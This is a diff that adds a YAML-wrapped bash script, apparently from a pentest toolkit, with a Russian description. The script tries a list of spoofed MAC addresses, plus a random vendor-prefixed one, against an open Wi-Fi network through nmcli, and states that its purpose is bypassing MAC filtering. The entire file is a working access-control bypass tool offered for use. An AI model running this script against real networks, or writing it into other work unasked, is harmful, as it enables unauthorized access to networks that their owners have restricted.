@@ -1,0 +1,56 @@
+description: |-
+  Перечисляет MAC-адреса для подключения к открытым точкам доступа.
+  Может помочь с обходом MAC-фильтрации.
+  Для подключения используется nmcli.
+
+  P.S.: Это явно плохая идея для брута, так что не мучай этот скрипт слишком большими списками
+author: vinzekatze
+tags:
+  - wpa open
+  - connection
+  - mac enumeration
+  - nmcli
+
+arguments:
+  interface:
+    description: интерфейс
+    replacer: '#interface#'
+  ssid:
+    description: essid или bssid сети для подключения
+    replacer: '#ssid#'
+  m:
+    default:
+      -
+    description: MAC-адреса
+    multiple: true
+    replacer: '#macaddr#'
+    metavar: MAC
+
+mode:
+  format:
+    interface: '{!r}'
+    ssid: '{!r}'
+    m: '{!r}'
+
+shell: bash
+script: >-
+  ssid=#ssid#;
+  interface=#interface#;
+  iw dev $interface info 2>&1 1>/dev/null || { echo "Device $interface not found"; exit ; };
+  sudo ip link set $interface down;
+  sudo iw $interface set type managed;
+  sudo ip link set $interface up;
+  sudo nmcli dev set $interface managed yes; sleep 1;
+  conname="$(echo ${ssid}-$(date +%Y%m%d%H%M%S) | sed 's/[^a-zA-Z0-9-]/_/g')";
+  randmac=$(macchanger -l | awk '{ print $3 }' | shuf -n 1):$(printf '%02x:%02x:%02x' $[RANDOM%256] $[RANDOM%256] $[RANDOM%256]);
+  echo "[target] ssid: $ssid";
+  echo "[target] wlan: $interface";
+  echo "[target] Scanning networks...";
+  sudo nmcli device wifi list ifname "$interface" --rescan yes | cat | grep --color=never $ssid && { echo -e "[target] \e[1;92mFound\e[0m"; } || { echo -e "[target] \e[1;91mNot Found\e[0m"; exit; };
+  echo;
+  echo "Connection attempts:";
+  for macaddr in #macaddr# "$randmac"; do
+  echo -n "[$macaddr] ... ";
+  sudo nmcli connection add type wifi connection.autoconnect no con-name $conname ssid "$ssid" ifname "$interface" wifi.cloned-mac-address "$macaddr" &>/dev/null;
+  sudo nmcli connection up "$conname" &>/dev/null && { echo -e "\e[1;92mCONNECTED\e[0m"; echo; echo "Connection info:";echo "[nmcli] name:    $conname"; nmcli --fields 'IP4.ADDRESS' connection show $conname | awk -F '[ ]+' '{print "[nmcli] ip:      " $2}'; nmcli --fields 'IP4.GATEWAY' connection show $conname | awk -F '[ ]+' '{print "[nmcli] gateway: " $2}'; break 2; } || { echo -e "\e[1;91mFAIL\e[0m"; sudo nmcli connection delete "$conname" &>/dev/null; };
+  done
